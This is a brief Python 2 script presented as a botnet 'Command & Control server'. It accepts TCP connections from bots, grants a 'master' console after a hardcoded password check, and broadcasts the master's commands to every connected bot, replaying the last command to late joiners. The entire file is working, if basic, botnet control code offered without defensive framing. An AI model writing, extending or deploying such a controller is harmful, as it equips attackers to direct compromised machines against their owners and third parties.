# Date: 08/13/15
# Author: Ethical-H4CK3R
# Description: Command & Control server
#
#

import socket
import threading

class Server(object):
 ''' Command & Control server '''

 def __init__(self,ip=None,port=None,qsize=None):
  self.botnet = [] # online bots info
  self.alive = True
  self.master = None # the master computer
  self.previous = None # the last command, for botnets that connected late
  self.lock = threading.Lock()
  self.qsize = qsize if qsize else 1
  self.ip = ip if ip else '127.0.0.1'
  self.port = port if port else 12345
  self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  try:
   self.server.bind((self.ip,self.port))
   self.server.listen(self.qsize)
  except:
   exit('Failed to start on: {}:{}'.format(self.ip,self.port))
  print 'Server on: {}:{}'.format(self.ip,self.port)

 def sendCmd(self,msg):
  self.previous = msg
  for n,bot in enumerate(self.botnet):
   try:bot.sendall(msg)
   except:del self.botnet[n]

 def exit(self):
  self.alive = False
  for bot in self.botnet:
   try:
    bot.shutdown(socket.SHUT_RDWR)
    bot.close()
   except:pass
  del self.botnet[:]

  if self.master:
   try:
    self.master.shutdown(socket.SHUT_RDWR)
    self.master.close()
   finally:
    exit()

 def masterConnection(self):
  while self.alive:
   try:
    cmd = self.master.recv(1024) # just send messages for now

    if cmd.strip():
     self.sendCmd(cmd)
    #  self.master.sendall('done') # response after command
   except KeyboardInterrupt:
    self.master.shutdown(socket.SHUT_RDWR)
    self.master.close()

 def communicate(self,conn,addr):
  data = conn.recv(1024)
  if not data:return

  with self.lock:
   print '[-] Received: {}\n[-] From: {a[0]}\n[-] Port: {a[1]}\n\n'.\
   format(data,a=addr)

  if data == 'master':
   conn.sendall('Submit Password')
   password = conn.recv(1024)

   if password == 'password':
    self.master = conn
    self.master.sendall('access granted')
    self.masterConnection() # give master a console
   else:
    conn.sendall('[!] Access Denied')
  else:
   self.botnet.append(conn) # save the bot connection
   if self.previous:
    conn.sendall(self.previous)

 def run(self):
  while self.alive:
   try:
    conn, addr = self.server.accept() # wait for a connection to occur
    threading.Thread(target=self.communicate,args=[conn,addr]).start() # start communicating
   except KeyboardInterrupt:
    self.exit()

Server().run()
